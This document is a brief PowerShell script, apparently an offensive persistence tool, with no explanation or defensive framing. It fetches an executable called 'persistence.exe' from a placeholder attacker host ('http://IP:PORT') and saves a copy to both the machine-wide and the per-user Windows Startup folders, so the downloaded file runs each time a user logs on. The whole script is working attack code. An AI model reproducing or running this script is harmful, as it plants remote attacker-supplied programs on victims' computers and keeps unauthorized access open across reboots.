# Download and save it the startup folder and startup Program

$sourceUrl = "http://IP:PORT"
$filename = "persistence.exe"

$currentUser = $env:UserName

$globalStartupPath = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\$filename"
$userStartupPath = "C:\Users\$currentUser\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\$filename"

Invoke-WebRequest -Uri $sourceUrl -OutFile $globalStartupPath
Invoke-WebRequest -Uri $sourceUrl -OutFile $userStartupPath

Write-Host "File downloaded and saved to both startup locations."
